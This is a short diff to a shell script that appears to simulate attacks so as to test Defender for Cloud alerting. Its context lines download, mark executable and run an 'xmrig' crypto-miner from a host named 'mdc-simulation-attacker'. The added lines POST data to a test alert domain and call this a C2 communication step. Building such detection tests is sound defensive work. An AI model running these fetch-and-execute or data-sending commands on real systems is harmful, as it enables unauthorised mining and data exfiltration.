@@ -83,3 +83,10 @@ curl -sO http://mdc-simulation-attacker/xmrig
 chmod +x xmrig  
 ./xmrig
 echo " "
+
+# ti-domain
+echo "--- Threat Intelligence Communication ---"
+echo "Sending data to known malicious domain"
+curl -s -m 10 -X POST "http://mdc-eicar.alerts.security.azure.com?SendingData" -o /dev/null
+echo "C2 communication sequence complete"
+echo " "
